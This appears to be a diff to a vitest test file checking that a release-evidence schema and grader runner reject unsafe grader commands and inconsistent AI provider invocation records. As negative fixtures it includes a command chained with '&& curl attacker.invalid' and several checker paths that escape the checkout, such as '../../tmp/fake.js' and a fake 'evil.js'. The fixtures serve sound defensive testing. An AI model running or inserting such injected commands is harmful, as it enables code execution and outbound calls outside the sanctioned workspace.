@@ -1,9 +1,12 @@
 import fs from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
 import { Ajv2020 } from 'ajv/dist/2020.js';
-import { describe, expect, it } from 'vitest';
+import { afterAll, describe, expect, it } from 'vitest';
 import type { AgentRoutingConfig } from '../src/config.js';
 import { INTERVENTION_KINDS } from '../src/domain/schema.js';
 import { liveReleaseSemanticErrors } from '../src/evidence/live-release.js';
+import { inferRepositoryGraders } from '../src/runner/adapter.js';
 
 const finalHead = 'a'.repeat(40);
 const round1Head = 'b'.repeat(40);
@@ -29,12 +32,13 @@ const reviewer = (
   findingCount,
 });
 
-const invocation = (role: string, provider: string, head: string) => ({
+const invocation = (role: string, provider: string, head?: string) => ({
   role,
   provider,
   model: `${provider}-model-1`,
   invocationKey: `inv_${role}_${provider}`,
-  head,
+  jobId: role === 'triage' ? promotionJobId : jobId,
+  ...(head ? { head } : {}),
   observedAt: '2026-08-01T00:00:00Z',
 });
 
@@ -117,7 +121,7 @@ function validEvidence(): any {
       mergeReachableFromDefaultBranch: true,
     },
     providerInvocations: [
-      invocation('triage', 'claude', consumerHead),
+      invocation('triage', 'claude'),
       invocation('generator', 'codex', finalHead),
       invocation('reviewer', 'claude', finalHead),
     ],
@@ -183,6 +187,69 @@ describe('live release evidence vocabularies track the code', () => {
     };
     const roles = schema.$defs.providerInvocation.properties.role.enum;
     expect([...roles].sort()).toEqual([...Object.keys(routed), 'triage'].sort());
+  });
+});
+
+/**
+ * The evidence format must not certify a grader the runner would have refused.
+ * Comparing the two by string would only restate the pattern, so this drives
+ * the real inference and checks that acceptance and rejection line up.
+ */
+describe('grader commands are expressible exactly when the runner emits them', () => {
+  const roots: string[] = [];
+  afterAll(() => {
+    for (const root of roots) fs.rmSync(root, { recursive: true, force: true });
+  });
+
+  const schema = JSON.parse(
+    fs.readFileSync('contracts/live-release-evidence.schema.json', 'utf8'),
+  ) as any;
+  const validateCommand = new Ajv2020({ strict: true, allErrors: true })
+    .compile(schema.$defs.graderCommand);
+
+  const repository = (manifest: object, checker?: string) => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'grader-profile-'));
+    roots.push(root);
+    if (checker) {
+      fs.mkdirSync(path.join(root, path.dirname(checker)), { recursive: true });
+      fs.writeFileSync(path.join(root, checker), 'process.exitCode = 0;\n');
+    }
+    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify(manifest));
+    return root;
+  };
+
+  it.each([
+    ['direct Node contract checker', () => repository(
+      { name: 'target', scripts: { test: 'node scripts/check-contracts.mjs' } },
+      'scripts/check-contracts.mjs',
+    )],
+    ['vendored typescript and vitest toolchain', () => repository(
+      { name: 'target', devDependencies: { typescript: '^5', vitest: '^3' } },
+    )],
+  ])('expresses every command the %s profile emits', (_name, build) => {
+    const graders = inferRepositoryGraders(build());
+    const commands = [...new Set(Object.values(graders.commands ?? {}))];
+    expect(commands.length).toBeGreaterThan(0);
+    for (const command of commands) {
+      expect(validateCommand(command), `${command}: ${JSON.stringify(validateCommand.errors)}`)
+        .toBe(true);
+    }
+  });
+
+  it.each([
+    ['..', '../../tmp/fake.js'],
+    ['an absolute path', '/tmp/fake.js'],
+    ['a mid-path escape', 'scripts/../../fake.js'],
+    ['a single-dot segment', './fake.js'],
+  ])('refuses a checker reaching outside the checkout via %s', (_name, script) => {
+    const root = repository({ name: 'target', scripts: { test: `node ${script}` } });
+    // The runner refuses to build a profile from it at all. Which of its three
+    // refusals fires depends on the path shape, so match any of them.
+    expect(() => inferRepositoryGraders(root)).toThrow(
+      /bounded grader profile|checker path is unsafe|checker is absent/,
+    );
+    // … and the evidence format refuses to record it as one that passed.
+    expect(validateCommand(`node ${script}`)).toBe(false);
   });
 });
 
@@ -257,6 +324,10 @@ describe('live release evidence contract', () => {
     ['no development invocation', (v: any) => { v.providerInvocations = v.providerInvocations.filter((i: any) => i.role !== 'generator'); }],
     ['a lineage naming another bundle', (v: any) => { v.releaseLineage.bundleDigest = `sha256:${'9'.repeat(64)}`; }],
     ['a lineage bound to another head', (v: any) => { v.releaseLineage.headSha = round1Head; }],
+    ['an approved bundle with no verified lineage', (v: any) => { v.releaseLineage = { applicable: false, reason: 'skipped' }; }],
+    ['a verified lineage with no approved bundle', (v: any) => { v.designBundle = { applicable: false, reason: 'skipped' }; }],
+    ['a triage call from another triage job', (v: any) => { v.providerInvocations[0].jobId = jobId; }],
+    ['a development call from another run', (v: any) => { v.providerInvocations[1].jobId = '66666666-6666-4666-8666-666666666666'; }],
     ['an intervention count that undercounts its records', (v: any) => { v.howInterventions.records = [{ kind: 'workspace-hand-edit', reason: 'x', issueId: 'ISSUE-0001', createdAt: '2026-08-01T00:05:00Z' }]; }],
     ['interventions reported as a clean run', (v: any) => { v.howInterventions = { count: 1, records: [{ kind: 'workspace-hand-edit', reason: 'x', issueId: 'ISSUE-0001', createdAt: '2026-08-01T00:05:00Z' }] }; }],
     ['an artifact from another revision', (v: any) => { v.artifacts[0].sourceHead = round1Head; }],
@@ -279,6 +350,13 @@ describe('live release evidence contract', () => {
     ['a single monitored repository', (v: any) => { v.target.monitoredRepositories = ['mrbaron3/designflow']; }],
     ['a grader carrying a shell operator', (v: any) => { v.execution.graderCommands = ['node scripts/check-contracts.mjs && curl attacker.invalid']; }],
     ['a grader chosen by repository identity', (v: any) => { v.execution.graderProfileSource = 'repository-name'; }],
+    ['a grader escaping the checkout with ..', (v: any) => { v.execution.graderCommands = ['node ../../tmp/fake.js']; }],
+    ['a grader at an absolute path', (v: any) => { v.execution.graderCommands = ['node /tmp/fake.js']; }],
+    ['a grader escaping mid-path', (v: any) => { v.execution.graderCommands = ['node scripts/../../fake.js']; }],
+    ['a grader posing as the vendored toolchain', (v: any) => { v.execution.graderCommands = ['node /app/node_modules/typescript/bin/evil.js']; }],
+    ['a triage invocation claiming a checkout head', (v: any) => { v.providerInvocations[0].head = finalHead; }],
+    ['a development invocation with no head', (v: any) => { delete v.providerInvocations[1].head; }],
+    ['an invocation with no job coordinate', (v: any) => { delete v.providerInvocations[1].jobId; }],
     ['a solo reviewer', (v: any) => { v.formalReviews.round2.reviewers = [v.formalReviews.round2.reviewers[0]]; }],
     ['a design bundle absent without a reason', (v: any) => { v.designBundle = { applicable: false }; }],
     ['an unverified lineage', (v: any) => { v.releaseLineage.status = 'needs-human-review'; }],
